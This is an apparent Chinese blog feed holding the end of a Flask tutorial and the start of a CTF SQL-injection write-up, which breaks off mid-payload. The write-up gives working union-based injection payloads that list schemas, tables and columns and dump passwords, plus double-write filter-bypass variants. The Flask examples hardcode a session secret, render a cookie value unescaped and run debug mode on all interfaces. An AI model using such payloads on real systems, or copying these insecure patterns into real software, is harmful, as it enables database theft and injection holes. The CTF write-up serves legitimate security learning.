app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>访问<code>http://127.0.0.1:5000/hello/flask</code>则会输出<code>Hello flask!</code>标题</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><ul><li><strong>{ % … %}</strong>：用于语句</li><li><strong>{ {  … } }</strong>：用于表达式可以打印到模板输出</li><li><strong>{ # … # }</strong>：用于未包含在模板输出中的注释</li><li><strong># … ##</strong>：用于行语句</li></ul><p>另外测试语句效果，修改hello.html为以下内容</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span>&#123;% if marks>50 %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span> Your result is pass!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>&#123;% else %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Your result is fail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>&#123;% endif %&#125;</code></pre><p>脚本中<code>@app.route(&#39;/hello/&lt;score&gt;&#39;)</code>修改为<code>@app.route(&#39;/hello/&lt;int:score&gt;&#39;)</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/1</code>时输出<code>Your result is fail</code></p><p>则当访问<code>http://127.0.0.1:5000/hello/100</code>时输出<code>Your result is pass!</code></p><p>注意这里必须要对传入的score定义为int型，否则会被当成字符串处理，就会一直输出<code>Your result is pass!</code></p><h2 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h2><p>hello.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span>          <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>&#123; &#123;  url_for('static', filename = 'hello.js') &#125;&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>sayHello()<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>Say Hello<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>hello.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, render_templateapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index():   return render_template(&quot;hello.html&quot;)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>访问<code>http://127.0.0.1:5000/</code>点击Say Hello弹窗Hello World</p><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask,redirect,url_for,request,render_template,make_response,escape,session@app.route(&#39;&#x2F;&#39;)def index():   return render_template(&#39;index.html&#39;)@app.route(&#39;&#x2F;setcookie&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def setcookie():   if request.method &#x3D;&#x3D; &#39;POST&#39;:       user &#x3D; request.form[&#39;nm&#39;]       resp &#x3D; make_response(render_template(&#39;readcookie.html&#39;))       resp.set_cookie(&#39;userID&#39;,user)       return resp@app.route(&#39;&#x2F;getcookie&#39;)def getcookie():   name &#x3D; request.cookies.get(&#39;userID&#39;)   a &#x3D; &quot;&lt;h1&gt;welcome &#39;&#123; &#125;&#39;&lt;&#x2F;h1&gt;&quot;.format(name)   return aif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/setcookie<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>Enter userID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>nm<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>Login<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>readcookie.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>  <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/getcookie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click here to read cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>首先在访问<code>http://127.0.0.1:5000/</code>传入flask，点击Click here to read cookie即可看到<code>welcome &#39;flask&#39;</code></p><h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>session是存储在服务器上的，会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,sessionimport osapp &#x3D; Flask(__name__)app.secret_key &#x3D; &#39;any random string&#39;#app.secret_key &#x3D; os.urandom(12)@app.route(&#39;&#x2F;&#39;)def index():    if &#39;username&#39; in session:        username &#x3D; session[&#39;username&#39;]        return &#39;Logged in as &#39; + username + &#39;&lt;br&gt;&#39; + &quot;&lt;b&gt;&lt;a href &#x3D; &#39;&#x2F;logout&#39;&gt;click here to log out&lt;&#x2F;a&gt;&lt;&#x2F;b&gt;&quot;    return &quot;You are not logged in &lt;br&gt;&lt;a href &#x3D; &#39;&#x2F;login&#39;&gt;&lt;&#x2F;b&gt;&quot; + &quot;click here to log in&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&quot;@app.route(&#39;&#x2F;login&#39;, methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    if request.method &#x3D;&#x3D; &#39;POST&#39;:        session[&#39;username&#39;] &#x3D; request.form[&#39;username&#39;]        return redirect(url_for(&#39;index&#39;))    return &#39;&#39;&#39;   &lt;form action &#x3D; &quot;&quot; method &#x3D; &quot;post&quot;&gt;      &lt;p&gt;&lt;input type &#x3D; text name &#x3D; username &#x2F;&gt;&lt;&#x2F;p&gt;      &lt;p&gt;&lt;input type &#x3D; submit value &#x3D; Login &#x2F;&gt;&lt;&#x2F;p&gt;   &lt;&#x2F;form&gt;   &#39;&#39;&#39;@app.route(&#39;&#x2F;logout&#39;)def logout():    session.pop(&#39;username&#39;,None)    return redirect(url_for(&#39;index&#39;))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>这里将session_key设置成了any random string</p><h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h2><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,sessionimport osapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;login.html&#39;)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    if request.method &#x3D;&#x3D; &#39;POST&#39; and request.form[&#39;username&#39;] &#x3D;&#x3D; &#39;admin&#39;:        return redirect(url_for(&#39;success&#39;))    return redirect(url_for(&#39;index&#39;))@app.route(&#39;&#x2F;success&#39;)def success():    return &#39;logged in successfully&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>当用户输入不为admin时则直接302重定向到login界面</p><p>login.html</p><pre class="language-python" data-language="python"><code class="language-python">&lt;html&gt;   &lt;body&gt;      &lt;form action &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.102:5000&#x2F;login&quot; method &#x3D; &quot;post&quot;&gt;         &lt;p&gt;Enter Name:&lt;&#x2F;p&gt;         &lt;p&gt;&lt;input type &#x3D; &quot;text&quot; name &#x3D; &quot;username&quot; &#x2F;&gt;&lt;&#x2F;p&gt;         &lt;p&gt;&lt;input type &#x3D; &quot;submit&quot; value &#x3D; &quot;submit&quot; &#x2F;&gt;&lt;&#x2F;p&gt;      &lt;&#x2F;form&gt;   &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>报错：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,session,abortimport osapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;login.html&#39;)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    if request.method &#x3D;&#x3D; &#39;POST&#39;:        if request.form[&#39;username&#39;] &#x3D;&#x3D; &#39;admin&#39;:            return redirect(url_for(&#39;success&#39;))        else:            abort(401)    else:        return redirect(url_for(&#39;index&#39;))@app.route(&#39;&#x2F;success&#39;)def success():    return &#39;logged in successfully&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>Flask.abort(code)</code>：带有错误代码的abort函数</p><ul><li><strong>400</strong> - 用于错误请求</li><li><strong>401</strong> - 用于未身份验证的</li><li><strong>403</strong> - Forbidden</li><li><strong>404</strong> - 未不到</li><li><strong>406</strong> - 表示不接受</li><li><strong>415</strong> - 用于不支持的媒体类型</li><li><strong>429</strong> - 请求过多</li></ul><p>若登录不是admin则报401：<code>Unauthorized</code>错误</p><h2 id="消息闪现"><a href="#消息闪现" class="headerlink" title="消息闪现"></a>消息闪现</h2><pre class="language-python" data-language="python"><code class="language-python"># -*- coding:UTF-8 -*-from flask import Flask,redirect,url_for,request,render_template,make_response,escape,session,abort,flashimport osapp &#x3D; Flask(__name__)app.secret_key &#x3D; os.urandom(12)@app.route(&#39;&#x2F;&#39;)def index():    return render_template(&#39;index.html&#39;)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():    error &#x3D; None    if request.method &#x3D;&#x3D; &#39;POST&#39;:        if request.form[&#39;username&#39;] !&#x3D; &#39;admin&#39; or request.form[&#39;password&#39;] !&#x3D; &#39;admin&#39;:            error &#x3D; &#39;Invalid username or password. Please try again!&#39;        else:            flash(&#39;You were successfully logged in&#39;)            return redirect(url_for(&#39;index&#39;))    return render_template(&#39;login.html&#39;, error &#x3D; error)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>flash(message, category)</code>：将消息传递给下一个请求，该请求通常是一个模板。</p><ul><li><strong>message</strong>：参数是要闪现的实际消息。</li><li><strong>category</strong>：参数是可选的。它可以是“error”，“info”或“warning”。</li></ul><p><code>get_flashed_messages(with_categories, category_filter)</code>：从会话中删除消息</p><p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。第一个默认为False</p><p>典型的消息闪现模板：</p><pre class="language-html" data-language="html"><code class="language-html">&#123;% with messages = get_flashed_messages() %&#125;   &#123;% if messages %&#125;      &#123;% for message in messages %&#125;         &#123;&#123;  message &#125;&#125;      &#123;% endfor %&#125;   &#123;% endif %&#125;&#123;% endwith %&#125;</code></pre><p>下面给出html代码：</p><p>index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>&#123;% with messages = get_flashed_messages() %&#125;    &#123;% if messages %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          &#123;% for message in messages %&#125;          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>&#123; &#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          &#123;% endfor %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    &#123;% endif %&#125; &#123;% endwith %&#125; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Flask Message Flashing Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Do you want to <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>&#123;&#123;  url_for('login') &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>log in?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>login.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token doctype">&lt;!doctype html></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>   &#123;% if error %&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Error:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span> &#123;&#123;  error &#125;&#125;   &#123;% endif %&#125;   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation">=</span> post</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> text</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation">=</span> username</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>&#123;&#123; request.form.username &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> password</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation">=</span> password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> submit</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> Login</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>访问<code>http://127.0.0.1:5000/</code>点击login后进入登录界面，随后如果输入的username和password不是admin的话会在界面上显示error消息，若登录成功则跳转到index页面上方显示登录成功消息</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>upload.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>&#123;% with messages = get_flashed_messages() %&#125;    &#123;% if messages %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          &#123;% for message in messages %&#125;          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&#123;&#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>          &#123;% endfor %&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    &#123;% endif %&#125; &#123;% endwith %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>post</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span>multipart/form-data</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>file</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>Upload</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python">import osfrom flask import Flask, flash, request, redirect, url_for,send_from_directory,render_templatefrom werkzeug.utils import secure_filenameUPLOAD_FOLDER &#x3D; r&#39;E:\\flask\\upload\\&#39;ALLOWED_EXTENSIONS &#x3D; &#123; &#39;txt&#39;, &#39;pdf&#39;, &#39;png&#39;, &#39;jpg&#39;, &#39;jpeg&#39;, &#39;gif&#39;&#125;app &#x3D; Flask(__name__)app.config[&#39;MAX_CONTENT_LENGTH&#39;] &#x3D; 16 * 1024 * 1024app.config[&#39;UPLOAD_FOLDER&#39;] &#x3D; UPLOAD_FOLDERapp.secret_key &#x3D; os.urandom(12)def allowed_file(filename):  #判断上传的文件是否非法    if filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS:        return filename    else:        flash(&#39;illegal file&#39;)        return False@app.route(&#39;&#x2F;&#39;)def upload():    return render_template(&#39;upload.html&#39;)@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def upload_file():    if request.method &#x3D;&#x3D; &#39;POST&#39;:        # check if the post request has the file part        if &#39;file&#39; not in request.files:             flash(&#39;No file part&#39;)            return redirect(url_for(&#39;upload&#39;))        file &#x3D; request.files[&#39;file&#39;]          # if user does not select file, browser also        # submit an empty part without filename        if file.filename &#x3D;&#x3D; &#39;&#39;:            flash(&#39;No selected file&#39;)            return redirect(request.url)        if file and allowed_file(file.filename):              filename &#x3D; secure_filename(file.filename)            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename))#save方法保存文件            return redirect(url_for(&#39;uploaded_file&#39;,filename&#x3D;filename))    return redirect(url_for(&#39;upload&#39;))@app.route(&#39;&#x2F;uploads&#x2F;&lt;filename&gt;&#39;)def uploaded_file(filename):    return send_from_directory(app.config[&#39;UPLOAD_FOLDER&#39;],filename)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>不得不说，官方的代码还是要强一些，当上传为空时会报错，非法文件也会报错，但上传成功后跳转到上传的文件url处</p><p> <code>UPLOAD_FOLDER</code> 是上传文 件要储存的目录， <code>ALLOWED_EXTENSIONS</code> 是允许上传的文件扩展名的集合，<code>MAX_CONTENT_LENGTH</code>是限制的上传文件的大小</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul><li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li><li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li><li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li><li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li></ul><p>参考链接：</p><blockquote><p><a href="https://dormousehole.readthedocs.io/en/latest/index.html">https://dormousehole.readthedocs.io/en/latest/index.html</a>     （官方文档）</p><p><a href="https://www.w3cschool.cn/flask/">https://www.w3cschool.cn/flask/</a>   （W3Cschool教程）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;Flask是一个用Python编写的Web应用程序框架。 它由 &lt;strong&gt;Armin Ronacher&lt;/strong&gt; 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和&lt;a href=&quot;http://docs.jinkan.org/docs/jinja2/&quot;&gt;Jinja2&lt;/a&gt;模板引擎。两者都是Pocco项目。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dormousehole.readthedocs.io/en/latest/&quot;&gt;Flask中文文档&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="Flask" scheme="https://www.extrader.top/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SQL注入</title>
    <link href="https://www.extrader.top/posts/e73517db/"/>
    <id>https://www.extrader.top/posts/e73517db/</id>
    <published>2020-03-24T16:00:00.000Z</published>
    <updated>2020-03-24T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="极客大挑战—LoveSQL"><a href="#极客大挑战—LoveSQL" class="headerlink" title="极客大挑战—LoveSQL"></a>极客大挑战—LoveSQL</h3><p><strong>解题核心</strong> ———————- <a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc"><strong>group_concat</strong>()</a></p><p>经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段</p><p>查数据库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(schema_name) from information_schema.schemata ;#</code></pre><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(table_name) from information_schema.tables;#</code></pre><p>查列：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(column_name) from information_schema.columns;#</code></pre><p>最后password对应的表名应该是前面查询表名最后一个</p><p>查l0ve1ysq1表最后一列的字段内容：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select null,null,group_concat(password) from l0ve1ysq1;#</code></pre><p>最终得到flag</p><h3 id="极客大挑战—BabySQL"><a href="#极客大挑战—BabySQL" class="headerlink" title="极客大挑战—BabySQL"></a>极客大挑战—BabySQL</h3><p><strong>解题核心</strong>—————–双写绕过</p><p>详细见CSDN上大佬的<a href="https://blog.csdn.net/whoim_i/article/details/102869687">文章</a>，另外附上文章的HTML文档</p><p>解题方法和上一个题目的差不多，只是这次多了个双写绕过</p><p>查库：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; uniunionon seselectlect null,null,group_concat(schema_name) frfromom infoorrmation_schema.schemata ;#</code></pre><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; ununionion seselectlect null,null,group_concat(table_name) 